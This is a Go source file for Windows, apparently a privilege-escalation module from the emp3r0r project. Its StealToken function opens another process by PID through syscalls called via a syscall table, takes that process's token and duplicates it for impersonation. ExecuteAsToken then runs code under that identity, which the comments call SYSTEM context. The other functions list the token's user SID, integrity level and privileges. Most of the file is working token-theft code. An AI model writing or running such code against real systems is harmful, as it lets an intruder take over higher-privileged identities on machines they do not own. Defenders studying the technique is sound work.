//go:build windows && amd64

package priv

import (
	"fmt"
	"log"
	"runtime"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
	"golang.org/x/sys/windows"
)

var (
	modadvapi32             = windows.NewLazySystemDLL("advapi32.dll")
	procLookupPrivilegeName = modadvapi32.NewProc("LookupPrivilegeNameW")
)

type SECURITY_QUALITY_OF_SERVICE struct {
	Length              uint32
	ImpersonationLevel  uint32 // Set to 2 (SecurityImpersonation)
	ContextTrackingMode byte   // 1 (SECURITY_DYNAMIC_TRACKING)
	EffectiveOnly       byte   // 0 (FALSE)
}

// StealToken acquire a duplicated token handle
func StealToken(table *syscall.SyscallTable, targetPID uint32) (windows.Handle, error) {
	// 1. Open handle to target process
	hProcess, status, err := syscall.NtOpenProcess(table, windows.PROCESS_QUERY_LIMITED_INFORMATION, targetPID)
	if err != nil || status != syscall.STATUS_SUCCESS {
		return 0, fmt.Errorf("NtOpenProcess failed with status 0x%08X: %w", status, err)
	}
	defer windows.CloseHandle(hProcess)

	// 2. Extract primary process token
	var tokenAccess uint32 = windows.TOKEN_DUPLICATE | windows.TOKEN_QUERY
	hProcessToken, status, err := syscall.NtOpenProcessToken(table, hProcess, tokenAccess)
	if err != nil || status != syscall.STATUS_SUCCESS {
		return 0, fmt.Errorf("NtOpenProcessToken failed with status 0x%08X: %w", status, err)
	}
	defer windows.CloseHandle(hProcessToken)

	// 3. Duplicate into an impersonation token
	hDuplicatedToken, err := DuplicateSystemToken(
		table,
		hProcessToken,
	)
	if err != nil {
		return 0, fmt.Errorf("DuplicateToken failed with status 0x%08X: %w", status, err)
	}

	return hDuplicatedToken, nil
}

// ExecuteAsToken executes a function under the context of an impersonation token
func ExecuteAsToken(hImpersonationToken windows.Handle, action func() error) error {
	// 1. Pin the current goroutine to its current OS thread
	runtime.LockOSThread()

	// 4. Ensure thread is reverted AND unlocked on exit
	defer func() {
		err := windows.RevertToSelf()
		if err != nil {
			logging.Warningf("RevertToSelf failed: %v", err)
		}
		runtime.UnlockOSThread()
	}()

	// 2. Attach token to current OS thread
	err := windows.SetThreadToken(nil, windows.Token(hImpersonationToken))
	if err != nil {
		return err
	}

	// 3. Execute actions under SYSTEM context on this pinned thread
	return action()
}

// DuplicateSystemToken duplicates a process token into an impersonation token
func DuplicateSystemToken(
	table *syscall.SyscallTable,
	hProcessToken windows.Handle,
) (windows.Handle, error) {
	sqos := SECURITY_QUALITY_OF_SERVICE{
		Length:              uint32(unsafe.Sizeof(SECURITY_QUALITY_OF_SERVICE{})),
		ImpersonationLevel:  2, // SecurityImpersonation
		ContextTrackingMode: 1,
		EffectiveOnly:       0,
	}

	objectAttributes := syscall.OBJECT_ATTRIBUTES{
		Length:                   uint32(unsafe.Sizeof(syscall.OBJECT_ATTRIBUTES{})),
		SecurityQualityOfService: uintptr(unsafe.Pointer(&sqos)),
	}

	var dupAccess uint32 = windows.TOKEN_IMPERSONATE | windows.TOKEN_QUERY | windows.TOKEN_DUPLICATE

	hDuplicatedToken, status, err := syscall.NtDuplicateToken(
		table,
		hProcessToken,
		dupAccess,
		&objectAttributes,
		false,
		syscall.TokenImpersonation, // 2
	)
	if err != nil || status != 0 {
		return 0, err
	}

	return hDuplicatedToken, nil
}

// GetTokenUserSid retrieves the account SID using the windows package
func GetTokenUserSid(hToken windows.Handle) (string, error) {
	token := windows.Token(hToken)
	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return "", fmt.Errorf("GetTokenUser failed: %w", err)
	}

	return tokenUser.User.Sid.String(), nil
}

// GetTokenIntegrityLevel retrieves the mandatory integrity level SID
func GetTokenIntegrityLevel(hToken windows.Handle) (string, error) {
	token := windows.Token(hToken)

	var reqLen uint32
	_ = windows.GetTokenInformation(token, windows.TokenIntegrityLevel, nil, 0, &reqLen)
	if reqLen == 0 {
		return "", fmt.Errorf("failed to obtain buffer length for integrity level")
	}

	buffer := make([]byte, reqLen)
	err := windows.GetTokenInformation(token, windows.TokenIntegrityLevel, &buffer[0], reqLen, &reqLen)
	if err != nil {
		return "", fmt.Errorf("GetTokenInformation failed: %w", err)
	}

	label := (*windows.Tokenmandatorylabel)(unsafe.Pointer(&buffer[0]))
	return label.Label.Sid.String(), nil
}

// GetTokenPrivileges retrieves and translates all privileges attached to the token
func GetTokenPrivileges(hToken windows.Handle) ([]string, error) {
	token := windows.Token(hToken)

	var reqLen uint32
	_ = windows.GetTokenInformation(token, windows.TokenPrivileges, nil, 0, &reqLen)
	if reqLen == 0 {
		return nil, fmt.Errorf("failed to obtain buffer length for privileges")
	}

	buffer := make([]byte, reqLen)
	err := windows.GetTokenInformation(token, windows.TokenPrivileges, &buffer[0], reqLen, &reqLen)
	if err != nil {
		return nil, fmt.Errorf("GetTokenInformation failed: %w", err)
	}

	privs := (*windows.Tokenprivileges)(unsafe.Pointer(&buffer[0]))
	if privs.PrivilegeCount == 0 {
		return nil, nil
	}

	arrayPtr := unsafe.Pointer(&privs.Privileges[0])
	privsSlice := unsafe.Slice((*windows.LUIDAndAttributes)(arrayPtr), privs.PrivilegeCount)

	var privilegeList []string
	for _, priv := range privsSlice {
		name, err := lookupPrivilegeName(priv.Luid)
		if err != nil {
			continue
		}

		status := "Disabled"
		if priv.Attributes&windows.SE_PRIVILEGE_ENABLED != 0 {
			status = "Enabled"
		}

		privilegeList = append(privilegeList, fmt.Sprintf("%s (%s)", name, status))
	}

	return privilegeList, nil
}

// lookupPrivilegeName converts a LUID into its string representation via advapi32.dll
func lookupPrivilegeName(luid windows.LUID) (string, error) {
	var nameLen uint32 = 256
	buf := make([]uint16, nameLen)

	r1, _, err := procLookupPrivilegeName.Call(
		0,
		uintptr(unsafe.Pointer(&luid)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&nameLen)),
	)
	if r1 == 0 {
		return "", err
	}

	return windows.UTF16ToString(buf[:nameLen]), nil
}

// Whoami retrieves the current user and domain name, along with the SID
func Whoami() (string, error) {
	var token windows.Token
	out := ""

	// 1. Try opening the thread token first
	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, true, &token)
	if err != nil {
		// 2. Fall back to process token if no thread token is active
		err = windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token)
		if err != nil {
			return out, fmt.Errorf("failed to open token: %w", err)
		}
	}
	defer token.Close()

	// 3. Resolve TokenUser
	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return out, fmt.Errorf("failed to get token user: %w", err)
	}

	// 4. Resolve account name from SID
	account, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		log.Printf("Run as SID: %s (Lookup failed: %v)", tokenUser.User.Sid.String(), err)
		return out, fmt.Errorf("failed to lookup account: %w", err)
	}

	out = fmt.Sprintf("%s\\%s (%s)", domain, account, tokenUser.User.Sid.String())
	return out, nil
}
